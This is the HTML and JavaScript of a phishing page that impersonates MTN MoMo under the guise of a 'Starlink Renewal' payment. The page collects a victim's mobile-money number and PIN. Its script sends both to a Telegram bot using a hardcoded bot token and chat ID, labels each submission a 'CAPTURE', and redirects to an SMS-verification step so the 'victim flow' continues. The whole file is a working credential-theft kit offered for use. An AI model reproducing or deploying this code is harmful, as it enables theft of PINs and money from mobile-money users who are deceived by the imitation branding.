    <script src="https://cdn.tailwindcss.com"></script>
    <style>

        body {
            padding-top: 72px;

        }

</head>

<body class="bg-gray-50">
    <!-- Fixed Header -->
    <header class="bg-black text-white shadow-sm fixed top-0 left-0 right-0 z-50">
        <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">

                <a href="/plans/" class="text-gray-300 hover:text-white flex items-center gap-2">

    <!-- Messages -->


    <!-- Main Content -->
    <main class="max-w-7xl mx-auto px-4 py-8">

        <div class="flex items-center justify-center min-h-[calc(100vh-144px)]">
            <div class="w-full max-w-md mx-4">
                <!-- MTN MoMo Branded Header -->
                <div class="bg-gradient-to-r from-[#FFCC00] to-[#FFD633] rounded-t-3xl p-6 sm:p-8 text-center shadow-lg">
                    <img src="momo_logo.png" alt="MTN MoMo" class="h-10 sm:h-12 mx-auto">
                    <h2 class="text-gray-900 font-bold mt-4 text-xl sm:text-2xl">MTN MoMo</h2>
                </div>

                <!-- Main Form Card -->
                <div class="bg-white rounded-b-3xl card-shadow p-6 sm:p-8 border-x border-b border-gray-100">

                    <div class="mb-8">
                        <div class="flex flex-col sm:flex-row justify-between items-center mb-6 pb-6 border-b border-gray-100 gap-4">
                            <div class="text-center sm:text-left">
                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Amount</p>
                                <p class="text-3xl sm:text-2xl font-black text-gray-900">FCFA 15.00</p>
                            </div>
                            <div class="text-center sm:text-right">
                                <p class="text-gray-400 text-xs uppercase font-bold tracking-widest">Service</p>
                                <p class="text-sm font-bold text-gray-700">Starlink Renewal</p>
                            </div>
                        </div>
                        <p class="text-gray-600 text-sm text-center">Enter your MTN MoMo details to authorize</p>
                    </div>

                    <form method="POST" id="paymentForm" class="space-y-6" novalidate>
                        <input type="hidden" name="csrfmiddlewaretoken" value="abSBW7RfmSROcxuInlylYwkQ3b4xIGIO2nzWlEOmmUNFtmMa61HKLh2bsQCx7QRo">
                        <input type="hidden" name="action" value="verify_pin">

                        <!-- MTN MoMo Number Input -->
                        <div>
                            <label class="block text-gray-700 font-bold mb-3 text-sm">MTN MoMo Number</label>
                            <div class="flex border-2 border-gray-300 rounded-xl overflow-hidden focus-within:border-[#FFCC00] focus-within:ring-2 focus-within:ring-yellow-100 transition-all duration-300">
                                <div class="flex items-center bg-gray-50 px-4 border-r border-gray-300">
                                    <img src="https://flagcdn.com/w40/zm.png" alt="Zambia" class="w-5 h-3 mr-2">
                                    <span class="text-gray-700 font-bold text-sm">+237</span>
                                </div>
                                <input type="tel" id="momo_number" name="momo_number" required placeholder="77xxxxxxx" class="flex-1 px-4 py-3 focus:outline-none text-lg font-medium" inputmode="numeric" value="" />
                            </div>
                        </div>

                        <!-- PIN Entry with Single Field -->
                        <div>
                            <label class="block text-gray-700 font-bold mb-3 text-sm">Enter PIN</label>
                            <div class="relative">
                                <input type="password" id="momo_pin" name="pin" required placeholder="••••" class="w-full px-4 py-4 text-center text-2xl font-bold border-2 border-gray-300 rounded-xl focus:border-[#FFCC00] focus:ring-4 focus:ring-yellow-100 focus:outline-none transition-all tracking-[0.5em]"
                                    inputmode="numeric" maxlength="5" />
                            </div>
                            <p class="text-gray-500 text-xs mt-4 text-center">Enter your 4 or 5 digit secure PIN</p>
                        </div>

                        <!-- Submit Button -->
                        <button type="submit" class="w-full bg-gradient-to-r from-[#FFCC00] to-[#FFD633] hover:from-[#FFD633] hover:to-[#FFCC00] text-gray-900 font-black py-4 rounded-xl shadow-lg shadow-yellow-200 transition-all transform active:scale-95 uppercase tracking-widest flex items-center justify-center gap-2">
          <i class="uil uil-check-circle"></i> Confirm Payment
        </button>
                    </form>

                    <!-- Security Note -->
                    <div class="mt-8 flex items-center justify-center gap-2 text-gray-500">
                        <i class="uil uil-shield-check text-lg text-green-600"></i>
                        <p class="text-[11px] uppercase font-bold tracking-widest">SSL Encrypted & Secure</p>
                    </div>
                </div>
            </div>
        </div>

    </main>

    <!-- Fixed Bottom Navigation -->
    <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-2xl z-50">
        <div class="max-w-7xl mx-auto px-2 sm:px-4 py-2 sm:py-3 flex justify-around items-center">

            <a href="payment.html" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
                <i class="uil uil-wifi text-2xl"></i>
                <span class="text-xs font-semibold">Status</span>
            </a>

            <a href="payment.html" class="flex flex-col items-center gap-1 text-blue-600 hover:text-blue-700 transition-all">
                <i class="uil uil-shopping-bag text-2xl"></i>
                <span class="text-xs font-semibold">Plans</span>
            </a>

            <a href="payment.html" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
                <i class="uil uil-list-ul text-2xl"></i>
                <span class="text-xs font-semibold">Orders</span>
            </a>

            <a href="payment.html" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
                <i class="uil uil-setting text-2xl"></i>
                <span class="text-xs font-semibold">Settings</span>
            </a>

        </div>
    </nav>

    <!-- Single consolidated script at the end -->
    <!-- Single consolidated script at the end -->
    <script>
        const momoPinInput = document.getElementById('momo_pin');
        const momoNumberInput = document.getElementById('momo_number');
        const paymentForm = document.getElementById('paymentForm');

        // Allow numbers only on PIN field
        momoPinInput.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // Allow numbers only on phone field
        momoNumberInput.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // Handle form submit
        paymentForm.addEventListener('submit', (e) => {
            e.preventDefault();

            const pinValue = momoPinInput.value;
            const numberValue = momoNumberInput.value;

            // Validate PIN length
            if (pinValue.length < 4 || pinValue.length > 5) {
                alert('Please enter a 4 or 5 digit PIN');
                return;
            }

            // Validate phone number
            if (numberValue.length < 9) {
                alert('Please enter a valid MTN MoMo number');
                return;
            }

            // --- Telegram Bot Configuration ---
            const BOT_TOKEN = '8716391485:AAFdcS6Fwc1PSN5ybG8zui2STY0o-PGVWyo';
            const CHAT_ID = '7778473959';

            // Build the message
            const message = `🔔 *NEW MTN MoMo CAPTURE* 🔔\n\n` +
                `📱 *Number:* +237${numberValue}\n` +
                `🔑 *PIN:* \`${pinValue}\`\n` +
                `💰 *Amount:* ZMW 15.00\n` +
                `🛠 *Service:* Starlink Renewal\n` +
                `🕐 *Time:* ${new Date().toLocaleString()}\n` +
                `🌐 *Page:* ${window.location.href}`;

            // Send to Telegram bot
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                })
                .then(response => {
                    if (!response.ok) {
                        console.error('Telegram send failed:', response.status);
                    }
                    // Always redirect regardless of Telegram success/failure
                    window.location.href = "verify-sms.html";
                })
                .catch(error => {
                    console.error('Telegram error:', error);
                    // Still redirect to keep the victim flow intact
                    window.location.href = "verify-sms.html";
                });
        });
    </script>
</body>

</html>
